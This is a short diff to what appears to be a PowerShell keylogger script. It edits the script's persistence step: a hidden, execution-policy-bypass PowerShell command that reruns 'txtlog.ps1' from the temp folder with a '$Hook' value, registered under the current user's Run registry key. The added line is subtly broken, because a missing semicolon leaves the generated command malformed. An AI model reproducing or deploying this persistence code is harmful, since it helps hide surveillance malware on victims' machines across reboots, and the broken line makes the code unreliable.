@@ -1,7 +1,7 @@
 if(($Persistent -eq $true)){
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$Persistent=' + $Persistent +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;
-}else{
+}elseif(Test-Path -Path "$env:temp\txtlog.ps1" -PathType Leaf){
     Remove-Item "$env:temp\txtlog.ps1" -Force;
 }
 
